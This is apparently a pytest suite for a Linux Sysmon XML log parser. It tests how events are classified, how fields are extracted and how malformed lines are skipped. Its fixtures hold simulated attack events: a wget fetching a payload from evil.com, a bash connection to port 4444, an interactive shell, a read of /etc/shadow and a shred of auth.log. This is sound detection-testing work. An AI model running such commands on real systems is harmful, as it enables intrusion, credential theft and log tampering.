"""Tests for the Linux Sysmon XML parser (sysmon_linux format)."""

import pytest
import pandas as pd
from pathlib import Path

from parser import parse_log, SUPPORTED_FORMATS


def _write(tmp_path, name, lines):
    p = tmp_path / name
    p.write_text('\n'.join(lines) + '\n', encoding='utf-8')
    return p


def _types(df):
    return set(df['event_type'])


def _event(dt, eid, image, extra='', host='host1', seq=1):
    return (
        f'<Event><System><Provider Name="Linux-Sysmon"/>'
        f'<EventID>{eid}</EventID>'
        f'<TimeCreated SystemTime="{dt}"/>'
        f'<EventRecordID>{seq}</EventRecordID>'
        f'<Computer>{host}</Computer></System>'
        f'<EventData><Data Name="Image">{image}</Data>'
        f'<Data Name="User">root</Data>{extra}</EventData></Event>'
    )


class TestSysmonLinuxFormat:
    def test_format_registered(self):
        assert 'sysmon_linux' in SUPPORTED_FORMATS

    def test_returns_dataframe(self, sysmon_linux_log):
        df = parse_log(sysmon_linux_log, fmt='sysmon_linux')
        assert isinstance(df, pd.DataFrame)

    def test_expected_columns(self, sysmon_linux_log):
        df = parse_log(sysmon_linux_log, fmt='sysmon_linux')
        assert {'timestamp', 'hostname', 'process', 'event_type', 'source_ip', 'user', 'raw'} == set(df.columns)

    def test_process_execution_detected(self, sysmon_linux_log):
        df = parse_log(sysmon_linux_log, fmt='sysmon_linux')
        assert 'Process Execution' in _types(df)

    def test_shell_execution_detected(self, sysmon_linux_log):
        df = parse_log(sysmon_linux_log, fmt='sysmon_linux')
        assert 'Shell Execution' in _types(df)

    def test_network_connection_detected(self, sysmon_linux_log):
        df = parse_log(sysmon_linux_log, fmt='sysmon_linux')
        assert 'Network Connection' in _types(df)

    def test_file_deleted_detected(self, sysmon_linux_log):
        df = parse_log(sysmon_linux_log, fmt='sysmon_linux')
        assert 'File Deleted' in _types(df)

    def test_file_access_on_sensitive_path(self, sysmon_linux_log):
        df = parse_log(sysmon_linux_log, fmt='sysmon_linux')
        assert 'File Access' in _types(df)

    def test_process_terminated_skipped(self, tmp_path):
        ts = '2024-06-14T02:17:00.000000Z'
        log = _write(tmp_path, 's.log', [
            _event(ts, '5', '/bin/ps', seq=1),                        # terminated — skip
            _event(ts, '1', '/usr/bin/id', seq=2),                    # process create — keep
        ])
        df = parse_log(log, fmt='sysmon_linux')
        assert len(df) == 1

    def test_command_stored_in_user_field(self, tmp_path):
        ts = '2024-06-14T02:17:00.000000Z'
        log = _write(tmp_path, 's.log', [
            _event(ts, '1', '/usr/bin/wget',
                   '<Data Name="CommandLine">wget http://evil.com/payload</Data>', seq=1),
        ])
        df = parse_log(log, fmt='sysmon_linux')
        row = df.iloc[0]
        assert row['event_type'] == 'Process Execution'
        assert 'wget' in (row['user'] or '')

    def test_dest_ip_in_source_ip(self, tmp_path):
        ts = '2024-06-14T02:17:00.000000Z'
        log = _write(tmp_path, 's.log', [
            f'<Event><System><Provider Name="Linux-Sysmon"/><EventID>3</EventID>'
            f'<TimeCreated SystemTime="{ts}"/><EventRecordID>1</EventRecordID>'
            f'<Computer>host1</Computer></System><EventData>'
            f'<Data Name="Image">/bin/bash</Data>'
            f'<Data Name="User">root</Data>'
            f'<Data Name="DestinationIp">203.0.113.42</Data>'
            f'<Data Name="DestinationPort">4444</Data>'
            f'<Data Name="Protocol">tcp</Data>'
            f'</EventData></Event>',
        ])
        df = parse_log(log, fmt='sysmon_linux')
        assert df.iloc[0]['source_ip'] == '203.0.113.42'
        assert df.iloc[0]['event_type'] == 'Network Connection'

    def test_file_access_sensitive(self, tmp_path):
        ts = '2024-06-14T02:17:00.000000Z'
        log = _write(tmp_path, 's.log', [
            _event(ts, '11', '/bin/cat',
                   '<Data Name="TargetFilename">/etc/shadow</Data>', seq=1),
        ])
        df = parse_log(log, fmt='sysmon_linux')
        assert df.iloc[0]['event_type'] == 'File Access'

    def test_file_create_non_sensitive_is_other(self, tmp_path):
        ts = '2024-06-14T02:17:00.000000Z'
        log = _write(tmp_path, 's.log', [
            _event(ts, '11', '/usr/bin/vim',
                   '<Data Name="TargetFilename">/tmp/notes.txt</Data>', seq=1),
        ])
        df = parse_log(log, fmt='sysmon_linux')
        assert df.iloc[0]['event_type'] == 'Other'

    def test_file_deleted_event(self, tmp_path):
        ts = '2024-06-14T02:17:00.000000Z'
        log = _write(tmp_path, 's.log', [
            _event(ts, '23', '/usr/bin/shred',
                   '<Data Name="TargetFilename">/var/log/auth.log</Data>', seq=1),
        ])
        df = parse_log(log, fmt='sysmon_linux')
        assert df.iloc[0]['event_type'] == 'File Deleted'

    def test_shell_classified_correctly(self, tmp_path):
        ts = '2024-06-14T02:17:00.000000Z'
        log = _write(tmp_path, 's.log', [
            _event(ts, '1', '/bin/bash',
                   '<Data Name="CommandLine">bash -i</Data>', seq=1),
        ])
        df = parse_log(log, fmt='sysmon_linux')
        assert df.iloc[0]['event_type'] == 'Shell Execution'

    def test_hostname_extracted(self, tmp_path):
        ts = '2024-06-14T02:17:00.000000Z'
        log = _write(tmp_path, 's.log', [
            _event(ts, '1', '/usr/bin/id', host='compromised-server', seq=1),
        ])
        df = parse_log(log, fmt='sysmon_linux')
        assert df.iloc[0]['hostname'] == 'compromised-server'

    def test_timestamp_is_utc_aware(self, sysmon_linux_log):
        df = parse_log(sysmon_linux_log, fmt='sysmon_linux')
        ts = df['timestamp'].dropna().iloc[0]
        assert ts.tzinfo is not None

    def test_sorted_by_timestamp(self, sysmon_linux_log):
        df = parse_log(sysmon_linux_log, fmt='sysmon_linux')
        ts = df['timestamp'].dropna()
        assert ts.is_monotonic_increasing

    def test_malformed_xml_skipped(self, tmp_path):
        ts = '2024-06-14T02:17:00.000000Z'
        log = _write(tmp_path, 's.log', [
            'this is not xml',
            '<Event><broken',
            _event(ts, '1', '/usr/bin/id', seq=3),
        ])
        df = parse_log(log, fmt='sysmon_linux')
        assert len(df) == 1

    def test_empty_log_returns_empty_df(self, empty_log):
        df = parse_log(empty_log, fmt='sysmon_linux')
        assert len(df) == 0
